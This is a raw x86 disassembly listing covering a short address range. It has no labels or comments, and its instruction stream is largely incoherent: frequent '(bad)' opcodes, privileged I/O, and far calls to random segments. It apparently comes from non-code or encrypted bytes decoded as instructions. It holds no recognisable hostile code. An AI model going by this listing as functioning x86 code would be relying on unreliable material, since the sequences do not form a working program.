  413c4c:	sbb    BYTE PTR [eax-0x57],dh
  413c4f:	lods   al,BYTE PTR ds:[esi]
  413c50:	cmp    BYTE PTR [edx+0x7d],dh
  413c53:	inc    esi
  413c54:	les    eax,FWORD PTR [edx]
  413c56:	loope  0x413c77
  413c58:	xchg   ebx,eax
  413c59:	int    0x16
  413c5b:	sar    DWORD PTR [esi-0x755c2844],0x1b
  413c62:	or     DWORD PTR [ebx+0x7f194a72],edx
  413c68:	enter  0x1b07,0x31
  413c6c:	pushf  
  413c6d:	out    0x7,eax
  413c6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c70:	sbb    BYTE PTR [ebx+0x1],bl
  413c73:	dec    eax
  413c74:	clc    
  413c75:	mov    al,ds:0x6654ab32
  413c7a:	rcr    BYTE PTR [ebx-0x1041e6ba],0xa0
  413c81:	jo     0x413c43
  413c83:	mov    ch,0x96
  413c85:	dec    eax
  413c86:	outs   dx,DWORD PTR ds:[esi]
  413c87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c88:	daa    
  413c89:	pop    esp
  413c8a:	jae    0x413c69
  413c8c:	call   0x972a:0xeb61906f
  413c93:	mov    eax,0x57856675
  413c98:	dec    esi
  413c99:	pusha  
  413c9a:	(bad)  
  413c9b:	pop    edi
  413c9c:	xchg   edi,eax
  413c9d:	lock jp 0x413cd3
  413ca0:	test   DWORD PTR [eax],edx
  413ca2:	dec    edx
  413ca3:	ss dec ecx
  413ca5:	imul   edi,DWORD PTR [eax+0x5],0xffffffde
  413ca9:	mov    al,ds:0x5e954503
  413cae:	icebp  
  413caf:	mov    eax,0x1e64d615
  413cb4:	imul   eax,DWORD PTR [ecx-0x7529ab24],0x21061f6d
  413cbe:	and    eax,0x668ffc8d
  413cc3:	int3   
  413cc4:	std    
  413cc5:	cli    
  413cc6:	ror    BYTE PTR [esi+0x4d],0x48
  413cca:	push   es
  413ccb:	sbb    dh,BYTE PTR [esp+esi*2]
  413cce:	inc    eax
  413ccf:	fist   DWORD PTR [edi]
  413cd1:	scas   eax,DWORD PTR es:[edi]
  413cd2:	lock adc eax,0xa66fe901
  413cd8:	push   esp
  413cd9:	xchg   esp,eax
  413cda:	sub    esi,ebp
  413cdc:	add    esp,esp
  413cde:	sbb    esi,ecx
  413ce0:	pop    edx
  413ce1:	call   0x96b6595
  413ce6:	adc    bl,BYTE PTR [edi+0x1f828a55]
  413cec:	cdq    
  413ced:	mov    al,0x1
  413cef:	jb     0x413d02
  413cf1:	pop    edx
  413cf2:	mov    edi,0x2596affb
  413cf7:	mov    bh,0x71
  413cf9:	test   DWORD PTR [eax+0x51],0x9b780fa2
  413d00:	shl    BYTE PTR ds:0x9fef359d,cl
  413d06:	ds scas eax,DWORD PTR es:[edi]
  413d08:	call   0x7c026300
  413d0d:	dec    esp
  413d0e:	fimul  DWORD PTR [di]
  413d11:	jb     0x413d08
  413d13:	imul   ebp,DWORD PTR [edx],0xffffffa0
  413d16:	push   cs
  413d17:	jle    0x413cf0
  413d19:	mov    WORD PTR [esi+eiz*8-0x45],?
  413d1d:	pop    ss
  413d1e:	inc    ecx
  413d1f:	add    eax,0x4602bbdf
  413d24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d25:	fcmovb st,st(1)
  413d27:	mov    esp,0xa635842c
  413d2c:	inc    ebp
  413d2d:	mov    WORD PTR [edi+0x2629f07e],es
  413d33:	pop    ebx
  413d34:	mov    ecx,0xb17529df
  413d39:	mov    dh,0x6f
  413d3b:	(bad)  
  413d3c:	(bad)  
  413d3d:	jbe    0x413cef
  413d3f:	or     cl,BYTE PTR [edi]
  413d41:	ficomp DWORD PTR [edi-0x33]
  413d44:	xor    DWORD PTR [esi+0x72],edi
  413d47:	dec    ecx
  413d48:	dec    DWORD PTR [edx+0x21e89bfc]
  413d4e:	add    eax,esi
  413d50:	ror    BYTE PTR [edi],0xb2
  413d53:	fistp  WORD PTR ds:0x5cb2dfad
  413d59:	push   esp
  413d5a:	add    DWORD PTR [esi],0xc67a7627
  413d60:	sar    edx,cl
  413d62:	sub    al,0x7a
  413d64:	jb     0x413d5d
  413d66:	mov    ch,0xc7
  413d68:	out    dx,al
  413d69:	lahf   
  413d6a:	rcpps  xmm4,XMMWORD PTR [ecx+0x5b]
  413d6e:	icebp  
  413d6f:	ins    BYTE PTR es:[edi],dx
  413d70:	pop    ss
  413d71:	out    dx,eax
  413d72:	mov    edi,0xfa8c8f97
  413d77:	pop    ss
  413d78:	or     esp,DWORD PTR [esi]
  413d7a:	fdiv   DWORD PTR [eax+0x22fee9c0]
  413d80:	dec    esi
  413d81:	jae    0x413d7b
  413d83:	mov    cl,0x5
  413d85:	or     BYTE PTR [edx+0x97c1fa8],dl
  413d8b:	fs pop ds
  413d8d:	cmp    dl,BYTE PTR [edx-0x54]
  413d90:	nop
  413d91:	dec    edi
  413d92:	mov    DWORD PTR [ebp+0x2afc642b],esp
  413d98:	and    esp,DWORD PTR [eax]
  413d9a:	clc    
  413d9b:	popf   
  413d9c:	lds    edi,FWORD PTR [ebx+0x30]
  413d9f:	mov    fs,WORD PTR [edx]
  413da1:	mov    ebx,0x727c13b6
  413da6:	js     0x413dc2
  413da8:	mov    al,ds:0x71b2cdf5
  413dad:	adc    DWORD PTR [esi+0x4f],0xffffffdc
  413db1:	dec    eax
  413db2:	out    0x30,al
  413db4:	fstp   TBYTE PTR [eax]
  413db6:	stos   BYTE PTR es:[edi],al
  413db7:	or     DWORD PTR [eax],ebx
  413db9:	or     esp,ecx
  413dbb:	outs   dx,BYTE PTR ds:[esi]
  413dbc:	add    al,BYTE PTR ds:[eax]
  413dbf:	mov    ebp,0x18b46a22
  413dc4:	dec    ebx
  413dc5:	ins    DWORD PTR es:[edi],dx
  413dc6:	mov    ebp,0x5e121a30
  413dcb:	jmp    0x1c5:0xdea52925
  413dd2:	jae    0x413d90
  413dd4:	test   DWORD PTR [ebx+0x27],ebp
  413dd7:	enter  0x868e,0xb9
  413ddb:	or     ah,BYTE PTR ds:0x570cac9f
  413de1:	addr16 xor eax,0x98cd7e4c
  413de7:	in     eax,0x13
  413de9:	xchg   edi,eax
  413dea:	fs loopne 0x413d75
  413ded:	stos   DWORD PTR es:[edi],eax
  413dee:	or     ah,ah
  413df0:	fstp   DWORD PTR [edx+0x6152d6cc]
  413df6:	push   ecx
  413df7:	lods   al,BYTE PTR ds:[esi]
  413df8:	jl     0x413e34
  413dfa:	push   ebp
  413dfb:	mov    eax,0x6648dec1
  413e00:	out    dx,al
  413e01:	xchg   edx,eax
  413e02:	int    0x2
  413e04:	retf   0xa8fd
  413e07:	xor    esp,DWORD PTR [esi]
  413e09:	xchg   ebp,eax
  413e0a:	lods   al,BYTE PTR es:[esi]
  413e0c:	and    BYTE PTR cs:[eax+0x50fed08b],0x77
  413e14:	leave  
  413e15:	in     al,dx
  413e16:	mov    bh,bh
  413e18:	gs test al,0xb9
  413e1b:	mov    eax,eax
  413e1d:	stos   DWORD PTR es:[edi],eax
  413e1e:	aam    0x57
  413e20:	jnp    0x413e4b
  413e22:	sub    dh,dl
  413e24:	mov    ebx,0x59d4cf3e
  413e29:	add    cl,BYTE PTR [edi+ebp*2]
  413e2c:	ins    DWORD PTR es:[edi],dx
  413e2d:	pop    ds
  413e2e:	mov    edi,0xbe8cabac
  413e33:	test   esi,eax
  413e35:	or     ch,BYTE PTR [edi]
  413e37:	int    0x4a
  413e39:	rcl    DWORD PTR [ecx+ebp*8],0x6b
  413e3d:	sub    DWORD PTR [ebp+0x23a80f02],edi
  413e43:	add    al,0x1b
  413e45:	xlat   BYTE PTR ds:[ebx]
  413e46:	push   ss
  413e47:	cmp    DWORD PTR es:[eax+0x3c],ebp
  413e4b:	(bad)  
  413e4c:	mov    esi,0x19870b8e
  413e51:	mov    dh,0x0
  413e53:	inc    esp
  413e54:	popa   
  413e55:	into   
  413e56:	pop    edx
  413e57:	inc    ebx
  413e58:	mov    ss,eax
  413e5a:	and    BYTE PTR [edx+esi*2+0x45c2eba5],ah
  413e61:	pop    eax
  413e62:	push   es
  413e63:	cmp    ebp,DWORD PTR [eax-0x7a24879c]
  413e69:	mov    edi,0x3754441f
  413e6e:	push   es
  413e6f:	lock lods al,BYTE PTR ds:[esi]
  413e71:	mov    cl,0x62
  413e73:	push   edx
  413e74:	push   edx
  413e75:	sub    ecx,eax
  413e77:	or     cl,al
  413e79:	pop    DWORD PTR [edi+0x433c95ad]
  413e7f:	pop    ss
  413e80:	pop    ecx
  413e81:	popf   
  413e82:	inc    ecx
  413e83:	loopne 0x413e56
  413e85:	or     ecx,DWORD PTR [eax+0x16]
  413e88:	(bad)  
  413e89:	rcl    BYTE PTR [edi+ebp*8+0x78],1
  413e8d:	ins    DWORD PTR es:[edi],dx
  413e8e:	scas   al,BYTE PTR es:[edi]
  413e8f:	clc    
  413e90:	add    eax,0x8ebc231b
  413e95:	cmp    eax,0x5870245
  413e9a:	adc    al,0x82
  413e9c:	push   ds
  413e9d:	in     al,dx
  413e9e:	xchg   esp,eax
  413e9f:	push   ss
  413ea0:	(bad)
  413ea4:	addr16 dec ebx
  413ea6:	lods   al,BYTE PTR ds:[esi]
  413ea7:	or     bh,BYTE PTR [edx+ebx*1]
  413eaa:	fsubr  QWORD PTR [ebx*2+0x7bf68234]
	...
  414089:	push   ebx
  41408a:	inc    edx
  41408b:	or     DWORD PTR [ecx+ebx*1-0x2a100801],edi
  414092:	pop    eax
  414093:	cdq    
  414094:	rcl    ebx,0x1b
  414097:	fcomip st,st(3)
  414099:	pop    ebx
  41409a:	push   ebx
  41409b:	add    DWORD PTR [eax],eax
  41409d:	and    BYTE PTR [edi],al
  41409f:	add    BYTE PTR [eax],al
  4140a1:	or     esp,DWORD PTR [edx-0x57c975b0]
  4140a7:	mov    eax,0xb8b27104
  4140ac:	stos   DWORD PTR es:[edi],eax
  4140ad:	js     0x414099
  4140af:	test   edx,esi
  4140b1:	gs (bad) 
  4140b4:	leave  
  4140b5:	inc    edi
  4140b6:	rcr    DWORD PTR [eax],cl
  4140b8:	stos   BYTE PTR es:[edi],al
  4140b9:	ret    
  4140ba:	dec    ebx
  4140bb:	aaa    
  4140bc:	inc    esp
  4140bd:	call   0xf9ab9144
  4140c2:	mov    esi,0xd015f5ca
  4140c7:	jno    0x4140e3
  4140c9:	(bad)  
  4140ca:	push   ebx
  4140cb:	mov    dl,0xab
  4140cd:	xor    BYTE PTR [ecx+0x1a7001a0],cl
  4140d3:	stos   DWORD PTR es:[edi],eax
  4140d4:	xchg   ebp,eax
  4140d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4140d6:	cs cs mov ebx,0xda9c2bee
  4140dd:	push   ebx
  4140de:	mov    ch,0x29
  4140e0:	xchg   edx,eax
  4140e2:	bound  ebx,QWORD PTR [esi-0x66b035cc]
  4140e8:	pop    ebx
  4140e9:	fistp  DWORD PTR [ecx-0x5462a4b6]
  4140ef:	mov    ch,0xde
  4140f1:	mov    dl,0x9a
  4140f3:	out    dx,eax
  4140f4:	pop    ds
  4140f5:	call   0xd465:0xf54d87dd
  4140fc:	jmp    0x414082
  4140fe:	dec    ebp
  4140ff:	ja     0x414169
  414101:	ss dec eax
  414103:	iret   
  414104:	repz xchg esi,eax
  414106:	retf   0x8901
  414109:	scas   al,BYTE PTR es:[edi]
  41410a:	xchg   ebp,eax
  41410b:	ffree  st(7)
  41410d:	repnz outs dx,DWORD PTR ds:[esi]
  41410f:	aad    0x60
  414111:	sbb    al,al
  414113:	ds mov bl,0xaf
  414116:	add    eax,0x65b882b2
  41411b:	sbb    al,0xaa
  41411d:	jl     0x414106
  41411f:	mov    BYTE PTR [ebx-0x52eed92f],ah
  414125:	sbb    eax,0x18288876
  41412a:	sub    ecx,DWORD PTR [edx-0xc6712d8]
  414130:	mov    ecx,0xe80c7b4
  414135:	lahf   
  414136:	div    DWORD PTR [ecx+0x1f55816f]
  41413c:	das    
  41413d:	les    ebp,FWORD PTR [edx-0x234f42aa]
  414143:	add    eax,0xab4002c3
  414148:	in     eax,dx
  414149:	aam    0x83
  41414b:	xchg   esi,eax
  41414c:	je     0x4141a3
  41414e:	popa   
  41414f:	les    ebp,FWORD PTR [eax+0x60]
  414152:	sub    DWORD PTR [esi+0x5ce773de],0xffffffdc
  414159:	leave  
  41415a:	add    ah,dh
  41415c:	xchg   BYTE PTR [ebx],bl
  41415e:	sar    BYTE PTR [eax+ecx*8],1
  414161:	xchg   ecx,eax
  414162:	jecxz  0x414164
  414164:	inc    ebp
  414165:	loope  0x414110
  414167:	mov    al,ds:0x2821e393
  41416c:	idiv   DWORD PTR [edx+0x3d77f36a]
  414172:	(bad)  
  414173:	sub    ah,dh
  414175:	add    ecx,0x74cbbbc9
  41417b:	sbb    al,bl
  41417d:	addr16 cwde 
  41417f:	shl    bh,cl
  414181:	inc    edx
  414182:	xor    al,0xf1
  414184:	cdq    
  414185:	and    DWORD PTR [edi+0x65],0xffffffe0
  414189:	adc    DWORD PTR ds:0xff344ebb,edi
  41418f:	cmp    DWORD PTR [ecx-0x76d13bf0],ebx
  414195:	mov    ecx,0xb1b34c16
  41419a:	inc    esi
  41419b:	scas   eax,DWORD PTR es:[edi]
  41419c:	fild   WORD PTR [ebx+0x20]
  41419f:	cli    
  4141a0:	and    ah,0x91
  4141a3:	mov    ds:0xc81fdd79,al
  4141a8:	jns    0x4141fb
  4141aa:	mov    eax,ds:0x311c8b0f
  4141af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4141b0:	stos   DWORD PTR es:[edi],eax
  4141b1:	mov    ds:0x56a4bda0,al
  4141b6:	xor    al,0xb
  4141b8:	inc    esi
  4141b9:	lock mov ebx,DWORD PTR [ecx-0x7be84e9f]
  4141c0:	cwde   
  4141c1:	lods   eax,DWORD PTR ds:[esi]
  4141c2:	pop    ss
  4141c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4141c4:	dec    ebx
  4141c5:	lock jb 0x414241
  4141c8:	inc    edi
  4141c9:	retf   
  4141ca:	ror    DWORD PTR [ecx-0x32e70721],0x8c
  4141d1:	push   0x563b6a5e
  4141d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4141d7:	lea    esi,[edi]
  4141d9:	es push ebp
  4141db:	idiv   ah
  4141dd:	push   esp
  4141de:	fistp  WORD PTR [edx]
  4141e0:	(bad)  
  4141e1:	aaa    
  4141e2:	popa   
  4141e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4141e4:	repnz and DWORD PTR [ebx-0x424351f1],edx
  4141eb:	xor    DWORD PTR [ebp+0x3e31376c],0x2a335f48
  4141f5:	push   edi
  4141f6:	pop    es
  4141f7:	pop    es
  4141f8:	cmp    DWORD PTR [esi],0x2a7620dd
  4141fe:	lods   eax,DWORD PTR ds:[esi]
  4141ff:	cmp    ebp,eax
  414201:	int    0xc1
  414203:	test   al,0xea
  414205:	dec    edi
  414206:	mov    edx,0xc1aa2af4
  41420b:	xor    BYTE PTR [esi+0x75],ah
  41420e:	xlat   BYTE PTR ds:[ebx]
  41420f:	aam    0xa9
  414211:	aas    
  414212:	sbb    edx,edx
  414214:	int    0xc9
  414216:	pop    ebx
  414217:	push   ebp
  414218:	mov    al,ds:0x63eecdb0
  41421d:	sbb    eax,0x401853fb
  414222:	mov    edx,0x39cf141c
  414227:	pop    eax
  414228:	enter  0xc46b,0x66
  41422c:	and    DWORD PTR [edx+0x5e7aa336],eax
  414232:	out    0x8d,eax
  414234:	mov    eax,0x19aadc6b
  414239:	retf   
  41423a:	outs   dx,BYTE PTR ds:[esi]
  41423b:	icebp  
  41423c:	lods   eax,DWORD PTR ds:[esi]
  41423d:	nop
  41423e:	xchg   edi,eax
  41423f:	and    ebx,DWORD PTR [esi+0x65]
  414242:	mov    BYTE PTR [edx-0x1f5c6e3b],dh
  414248:	mov    ch,0xc
  41424a:	idiv   BYTE PTR [esi+edi*1-0x3b702952]
  414251:	sub    DWORD PTR [ebx+0x4047c525],esp
  414257:	cmc    
  414258:	fdiv   QWORD PTR [edx+ebp*4+0x3d]
  41425c:	xchg   ebp,eax
  41425d:	sub    esp,DWORD PTR [eax+ebx*8+0x14a3c6c2]
  414264:	xchg   esi,eax
  414265:	sub    eax,0xd9e1aa00
  41426a:	jge    0x4142d8
  41426c:	adc    BYTE PTR [edx+0x5f65532f],0xa5
  414273:	jg     0x4142bc
  414275:	rol    DWORD PTR [eax+0x20],cl
  414278:	(bad)  
  41427a:	pop    ebx
  41427b:	test   eax,0xc03acdcf
  414280:	lods   eax,DWORD PTR ds:[esi]
  414281:	cld    
  414282:	rcr    DWORD PTR [ebx],1
  414284:	ins    BYTE PTR es:[edi],dx
  414285:	test   ebx,esi
  414287:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414288:	cwde   
  414289:	mov    dl,0x55
  41428b:	int3   
  41428c:	xor    eax,0x20409a0c
  414291:	pop    ecx
  414292:	jae    0x414254
  414294:	jb     0x41427c
  414296:	push   es
  414297:	or     dh,BYTE PTR [eax]
  414299:	mov    eax,ds:0xa9c8941d
  41429e:	rol    DWORD PTR [ebx-0x68],cl
  4142a1:	mov    bh,0x4d
  4142a3:	mov    eax,ds:0xa1c837da
  4142a8:	div    ecx
  4142aa:	cmp    DWORD PTR [ebx],0x252d42a
  4142b0:	ins    BYTE PTR es:[edi],dx
  4142b1:	and    al,0x21
  4142b3:	lods   eax,DWORD PTR ds:[esi]
  4142b4:	gs inc ebx
  4142b6:	in     al,dx
  4142b7:	scas   eax,DWORD PTR es:[edi]
  4142b8:	clc    
  4142b9:	imul   eax,DWORD PTR [edi+0x1c],0x6e
  4142bd:	retf   0x7ada
  4142c0:	cld    
  4142c1:	xor    esi,DWORD PTR [edi]
  4142c3:	test   al,0xf8
  4142c5:	hlt    
  4142c6:	push   0x1b
  4142c8:	in     eax,dx
  4142c9:	cwde   
  4142ca:	ds loop 0x41426e
  4142cd:	sbb    al,0x24
  4142cf:	sub    edx,ebx
  4142d1:	ret    
  4142d2:	add    DWORD PTR [ebp+0x1f],0xc3d44dbb
  4142d9:	xchg   esp,eax
  4142da:	cdq    
  4142db:	mov    DWORD PTR [esi-0x3c7d7b44],ebp
  4142e1:	or     DWORD PTR [edi+0x465666d9],0x73fbfa19
  4142eb:	mov    dh,0xcb
  4142ed:	rcr    DWORD PTR [edi-0x2af061f1],cl
  4142f3:	and    esi,DWORD PTR [ebx+0x16]
  4142f6:	sahf   
  4142f7:	pop    es
  4142f8:	cmp    edx,edx
  4142fa:	mov    dl,0xa
  4142fc:	sub    bp,WORD PTR [ecx]
  4142ff:	add    esp,esi
  414301:	(bad)  
  414302:	outs   dx,BYTE PTR ds:[esi]
  414303:	ins    BYTE PTR es:[edi],dx
  414304:	scas   eax,DWORD PTR es:[edi]
  414305:	mov    esi,0xf46582cf
  41430a:	add    edx,DWORD PTR [ebx-0x1e]
  41430d:	rcr    BYTE PTR [eax],cl
  41430f:	cmp    eax,ebx
  414311:	imul   edi,DWORD PTR [ecx-0x7c],0xffffffc6
  414315:	or     dh,al
  414317:	jecxz  0x4142f9
  414319:	std    
  41431a:	xchg   esp,eax
  41431b:	aad    0x98
  41431d:	xchg   esi,eax
  41431e:	mov    ecx,0xb6ec17d4
  414323:	dec    ecx
  414324:	sti    
  414325:	out    0x46,al
  414327:	mov    esi,esi
  414329:	addr16 inc ecx
  41432b:	mov    bl,0xb6
  41432d:	adc    eax,0x276ee143
  414332:	rol    DWORD PTR [ecx],cl
  414334:	inc    edx
  414335:	push   ecx
  414336:	(bad)  
  414337:	retf   
  414338:	gs (bad) 
  41433b:	sub    BYTE PTR [eax],ch
  41433d:	push   ebx
  41433e:	(bad)  
  41433f:	fstp   TBYTE PTR [eax]
  414341:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414342:	and    ch,BYTE PTR [esi-0x6e9a5d3f]
  414348:	lahf   
  414349:	sar    DWORD PTR [ecx-0x40969561],1
  41434f:	fnstcw WORD PTR [edx+esi*2-0x20587dfe]
  414356:	icebp  
  414357:	sbb    DWORD PTR [edi-0x3816247e],0x5
  41435e:	xchg   edi,eax
  41435f:	es pop esi
  414361:	pop    ecx
  414362:	jbe    0x41430a
  414364:	mov    esi,DWORD PTR [edx+0x50e9ff9f]
  41436a:	sbb    dh,BYTE PTR [edx+0xb751baf]
  414370:	inc    edx
  414371:	sbb    edi,esp
  414373:	inc    eax
  414374:	mov    ebp,0x6cb296f9
  414379:	adc    eax,0x84c1333c
  41437e:	and    cl,BYTE PTR [edx]
  414380:	push   ds
  414381:	bound  ebx,QWORD PTR [eax+0x12b2a868]
  414387:	(bad)  
  414389:	dec    ebx
  41438a:	mov    dl,0x12
  41438c:	in     al,0x2d
  41438e:	ja     0x41432b
  414390:	out    dx,al
  414391:	add    eax,0xf7d0f721
  414396:	or     eax,0xf4f1d353
  41439b:	int    0xf6
  41439d:	stos   BYTE PTR es:[edi],al
  41439e:	push   ds
  41439f:	sub    BYTE PTR [eax],dh
  4143a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4143a2:	pop    edi
  4143a3:	push   0x50
  4143a5:	push   esp
  4143a6:	xor    dl,BYTE PTR [eax-0x5327a7f9]
  4143ac:	gs pop ds
  4143ae:	rol    BYTE PTR [esi+0x1fac7a61],cl
  4143b4:	icebp  
  4143b5:	adc    eax,0x34
  4143b8:	mov    al,ds:0x57ecaf55
  4143bd:	cld    
  4143be:	pop    eax
  4143bf:	stos   BYTE PTR es:[edi],al
  4143c0:	int    0x67
  4143c2:	mov    esp,0x52104b7f
  4143c7:	xor    esi,ecx
  4143c9:	push   edx
  4143ca:	lock mov eax,ss:0x44b1ffd6
  4143d1:	aam    0x83
  4143d3:	and    eax,0x9e50d7c8
  4143d8:	add    eax,0x7c55e2e3
  4143dd:	xor    BYTE PTR [eax],bl
  4143df:	sbb    edi,DWORD PTR [esi-0x3e262a6e]
  4143e5:	or     bh,BYTE PTR [edx+0x64]
  4143e8:	outs   dx,DWORD PTR ds:[esi]
  4143e9:	adc    ah,BYTE PTR [esi+0x7cd4b5e4]
  4143ef:	in     eax,0x4a
  4143f1:	(bad)  
  4143f2:	jnp    0x41439e
  4143f4:	shr    dh,1
  4143f6:	push   es
  4143f7:	add    ebx,DWORD PTR [esi-0x6611f1f]
  4143fd:	int3   
  4143fe:	shl    dh,0xf0
  414401:	popf   
  414402:	mov    ecx,0xe059ff75
  414407:	in     eax,0x33
  414409:	test   eax,0x568bfed6
  41440e:	xor    bh,dl
  414410:	(bad)  
  414411:	in     al,dx
  414412:	arpl   WORD PTR [edx],si
  414414:	push   es
  414415:	push   edx
  414416:	xor    ecx,DWORD PTR [edx-0x160f9f3]
  41441c:	jecxz  0x4143dc
  41441e:	adc    eax,0xb360db00
  414423:	shl    BYTE PTR [edi-0x5041cb15],1
  414429:	mov    ebp,0xbf35fe3b
  41442e:	call   0xf5e5:0x2ea2e5e6
  414435:	jnp    0x41449e
  414437:	jle    0x414483
  414439:	push   ss
  41443a:	ds dec edx
  41443c:	cwde   
  41443d:	mov    ds:0xfb002770,eax
  414442:	sahf   
  414443:	push   0x72
  414445:	lods   al,BYTE PTR ds:[esi]
  414446:	iret   
  414447:	xor    DWORD PTR [edi],ecx
  414449:	nop
  41444a:	mov    ds:0xcb3125cb,eax
  41444f:	loop   0x414456
  414451:	(bad)  
  414452:	ja     0x4144aa
  414454:	sub    BYTE PTR ds:0x5d20c6e6,ah
  41445a:	aaa    
  41445b:	add    BYTE PTR [esi+0x37e3e278],0xf5
  414462:	push   eax
  414463:	mov    WORD PTR [edx+0x4c7ffc],?
  414469:	jnp    0x4144e5
  41446b:	ret    0xf5b1
  41446e:	stc    
  41446f:	pop    eax
  414470:	rol    cl,1
  414472:	push   edx
  414473:	aad    0x0
  414475:	inc    edi
  414476:	push   0x7a
  414478:	sbb    BYTE PTR [esi],ah
  41447a:	mov    ebp,0x7e6e3df
  41447f:	stos   DWORD PTR es:[edi],eax
  414480:	or     DWORD PTR [ebp-0x70],ebx
  414483:	add    ch,BYTE PTR [edx-0x64]
  414486:	idiv   BYTE PTR [esi+0x3a]
  414489:	pop    esp
  41448a:	int3   
  41448b:	(bad)  
  41448c:	jmp    FWORD PTR [eax]
  41448e:	xor    ebx,DWORD PTR [edx+0x1254e7c9]
  414494:	frstor [ecx-0x3ce73b2c]
  41449a:	pushf  
  41449b:	jne    0x414438
  41449d:	add    ah,BYTE PTR [eax+0x7f]
  4144a0:	xor    eax,0x759ea61e
  4144a5:	or     dh,BYTE PTR [eax-0x695b6c4a]
  4144ab:	(bad)  
  4144ac:	js     0x414523
  4144ae:	std    
  4144af:	nop
  4144b0:	test   BYTE PTR [eax+0x15de8de2],ah
  4144b6:	loope  0x41447c
  4144b8:	cmp    al,0xc1
  4144ba:	push   edx
  4144bb:	mov    al,ds:0x378b2bd2
  4144c0:	nop
  4144c1:	fist   DWORD PTR [eax-0x3e9aa33e]
  4144c7:	mov    cs,WORD PTR ds:0x22183bfc
  4144cd:	inc    eax
  4144cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4144d0:	ficom  DWORD PTR [ebp-0x70]
  4144d3:	out    dx,eax
  4144d4:	push   ss
  4144d5:	(bad)  
  4144d6:	fisub  WORD PTR [edx+edi*2+0x47]
  4144da:	mov    edx,DWORD PTR [ecx]
  4144dc:	sar    BYTE PTR [ecx-0x42],cl
  4144df:	inc    eax
  4144e0:	enter  0x2c5,0xc9
  4144e4:	nop
  4144e5:	add    DWORD PTR [ecx+0x58],esi
  4144e8:	jae    0x414528
  4144ea:	xchg   ecx,eax
  4144eb:	fisub  WORD PTR [eax-0x6b3add4f]
  4144f1:	cmp    eax,0x7dcec07c
  4144f6:	xchg   DWORD PTR [ebx+edx*1+0x6427628],esi
  4144fd:	loope  0x414546
  4144ff:	cmp    BYTE PTR [edx+0x13],cl
  414502:	paddb  mm1,QWORD PTR [esi+ecx*4-0x46]
  414507:	shl    DWORD PTR [eax+edx*8-0x24],0x3b
  41450c:	pop    edi
  41450d:	jmp    0x4144e5
  41450f:	mov    ch,0x8d
  414511:	pop    ds
  414512:	ficom  WORD PTR [esp+edi*8-0x4a]
  414516:	xchg   edx,eax
  414517:	in     al,0x1
  414519:	std    
  41451a:	xchg   esp,eax
  41451b:	mov    edx,0xf025cd5e
  414520:	popf   
  414521:	imul   esi,DWORD PTR [edx-0x750dc897],0xe9450799
  41452b:	loop   0x41452e
  41452d:	inc    ebx
  41452e:	loopne 0x4145a8
  414530:	psrad  mm1,QWORD PTR [eax]
  414533:	call   FWORD PTR [edx+0x76]
  414536:	jp     0x4144de
  414538:	jae    0x414542
  41453a:	mov    eax,0xa3df10c3
  41453f:	jns    0x414599
  414541:	push   es
  414542:	mov    ds:0x84adfabb,eax
  414547:	(bad)  
  414548:	or     dl,al
  41454a:	mul    ch
  41454c:	inc    edi
  41454d:	xchg   DWORD PTR [ebx],eax
  41454f:	loope  0x4145a7
  414551:	shr    BYTE PTR [eax],1
  414553:	inc    ebp
  414554:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414555:	mov    dl,0xe7
  414557:	les    edx,FWORD PTR [esi]
  414559:	sbb    eax,0x7ccb5ddd
  41455e:	aaa    
  41455f:	mov    ch,0x77
  414561:	sbb    ecx,DWORD PTR [esi-0x12187482]
  414567:	mov    edx,0xf7d3761f
  41456c:	shl    BYTE PTR [eax],1
  41456e:	jg     0x4145a8
  414570:	push   ss
  414571:	fs xchg esi,eax
  414573:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414574:	fsubr  DWORD PTR [edx+ebp*4-0x25b2a29a]
  41457b:	mov    ah,BYTE PTR [ebp-0xf]
  41457e:	loopne 0x4145d3
  414580:	mov    dl,0x99
  414582:	xchg   edi,eax
  414583:	dec    edx
  414584:	and    al,0xe9
  414586:	inc    esi
  414587:	xor    ebp,DWORD PTR [ecx+edx*4+0x71b7d352]
  41458e:	mov    dl,0xa
  414590:	call   0xf041:0xafd06f37
  414597:	je     0x41452f
  414599:	imul   ecx,esp,0x54
  41459c:	mov    eax,ds:0xd04ac686
  4145a1:	nop
  4145a2:	dec    eax
  4145a3:	cmp    BYTE PTR [edi],bh
  4145a5:	mov    edi,0xfa24df87
  4145aa:	and    BYTE PTR [edx],ah
  4145ac:	jne    0x414584
  4145ae:	lds    eax,FWORD PTR ds:0x51671c8e
  4145b4:	call   0xda1c2764
  4145b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4145ba:	jae    0x4145c6
  4145bc:	dec    edi
  4145bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4145be:	jp     0x414596
  4145c0:	adc    BYTE PTR [ebx+0x4cd168f0],cl
  4145c6:	std    
  4145c7:	jge    0x41456f
  4145c9:	or     eax,0xcde0215c
  4145ce:	scas   al,BYTE PTR es:[edi]
  4145cf:	dec    edx
  4145d0:	shl    BYTE PTR [ebx+ecx*2],0x50
  4145d4:	mov    edx,0x13469bf5
  4145d9:	test   BYTE PTR [ecx+ebx*8],bh
  4145dc:	mov    eax,0x8ac0f393
  4145e1:	or     edi,DWORD PTR [edx-0x25bd2ff]
  4145e7:	and    BYTE PTR [eax+0x7533045f],dl
  4145ed:	and    dl,BYTE PTR [edx]
  4145ef:	push   es
  4145f0:	in     al,dx
  4145f1:	popa   
  4145f2:	jmp    0x414623
  4145f4:	repz xchg esi,eax
  4145f6:	jp     0x4145ad
  4145f8:	popa   
  4145f9:	dec    edi
  4145fa:	xchg   bl,ah
  4145fc:	clc    
  4145fd:	(bad)  
  4145fe:	xchg   edx,eax
  4145ff:	cmp    eax,0xc935e560
